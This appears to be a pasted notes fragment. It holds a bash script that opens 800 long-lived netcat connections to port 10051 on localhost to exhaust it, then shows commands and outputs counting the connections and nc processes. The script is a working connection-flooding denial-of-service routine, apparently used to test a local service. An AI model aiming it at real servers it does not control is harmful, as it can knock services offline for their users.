#!/bin/bash

# Target server (localhost in this case)
TARGET="127.0.0.1"
PORT=10051 # 10050

# Number of connections to attempt (adjust based on your system's limits)
CONNECTIONS=800

echo "Attempting to exhaust port $PORT on $TARGET by opening $CONNECTIONS connections..."

for ((i=1; i<=CONNECTIONS; i++)); do
    # Open a connection in the background and keep it alive
    nc -w 3600 "$TARGET" "$PORT" < /dev/null &
    if (( i % 1000 == 0 )); then
        echo "Opened $i connections..."
    fi
done

echo "Done. Check system state (e.g., 'ss -tunap | grep :10051' or 'netstat -tunap | grep :10051')."

```

To count all connections (both established and listening) on a specific port (e.g., port 10051):

```bash

ss -tuln | grep :10051 | wc -l
```

The simplest way to count nc instances is to check how many nc processes are running.

```bash

# ps aux: Lists all running processes.
# grep [n]c: Filters for nc processes (the square brackets prevent grep from matching itself).
# wc -l: Counts the number of matching lines (i.e., nc processes).
ps aux | grep [n]c | wc -l
797
# run the script again
1572